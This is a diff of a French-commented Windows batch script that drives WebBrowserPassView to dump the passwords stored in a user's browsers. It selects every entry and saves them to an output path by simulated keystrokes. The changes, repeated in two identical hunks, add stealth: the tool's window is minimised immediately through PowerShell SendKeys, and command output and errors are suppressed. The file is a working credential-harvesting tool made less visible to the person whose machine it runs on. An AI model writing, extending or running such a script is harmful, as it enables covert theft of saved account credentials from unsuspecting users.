@@ -41,26 +41,31 @@ if not exist "%WBPV%" (
 )
 
 echo.
-echo Lancement de WebBrowserPassView (en arriere-plan)...
+echo Lancement de WebBrowserPassView...
 
-rem Lancer le logiciel minimise
-start /min "" "%WBPV%"
+rem Lancer le logiciel normalement
+start "" "%WBPV%"
 
 echo Attente du chargement...
-timeout /t 4 /nobreak >nul
+timeout /t 2 /nobreak >nul
+
+rem Minimiser immediatement la fenetre
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')) { $wsh.SendKeys('% n') }" >nul 2>&1
+
+timeout /t 1 /nobreak >nul
 
 echo Selection des donnees...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')"
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')" >nul 2>&1
 
 timeout /t 1 /nobreak >nul
 
 echo Initialisation de l export...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')"
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')" >nul 2>&1
 
 timeout /t 2 /nobreak >nul
 
 echo Envoi du chemin de sauvegarde...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')"
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
@@ -90,26 +95,31 @@ if not exist "%WBPV%" (
 )
 
 echo.
-echo Lancement de WebBrowserPassView (en arriere-plan)...
+echo Lancement de WebBrowserPassView...
 
-rem Lancer le logiciel minimise
-start /min "" "%WBPV%"
+rem Lancer le logiciel normalement
+start "" "%WBPV%"
 
 echo Attente du chargement...
-timeout /t 4 /nobreak >nul
+timeout /t 2 /nobreak >nul
+
+rem Minimiser immediatement la fenetre
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')) { $wsh.SendKeys('% n') }" >nul 2>&1
+
+timeout /t 1 /nobreak >nul
 
 echo Selection des donnees...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')"
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')" >nul 2>&1
 
 timeout /t 1 /nobreak >nul
 
 echo Initialisation de l export...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')"
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')" >nul 2>&1
 
 timeout /t 2 /nobreak >nul
 
 echo Envoi du chemin de sauvegarde...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')"
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
